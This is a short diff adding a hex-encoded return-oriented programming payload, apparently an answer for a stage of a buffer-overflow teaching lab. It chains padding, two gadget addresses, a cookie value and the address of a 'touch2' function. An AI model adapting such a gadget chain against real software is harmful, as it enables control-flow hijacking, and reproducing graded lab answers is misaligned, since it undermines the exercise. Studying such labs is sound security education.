@@ -1,0 +1,7 @@
+00 00 00 00 00 00 00 00     /* pad */
+00 00 00 00 00 00 00 00     /* pad */
+00 00 00 00 00 00 00 00     /* pad */
+ee 27 40 00 00 00 00 00     /* gadget 1: popq %rax */
+48 8e ca 4b 00 00 00 00     /* cookie value */
+03 28 40 00 00 00 00 00     /* gadget 2: movq rax, rdi */
+2b 26 40 00 00 00 00 00     /* address of touch2 */
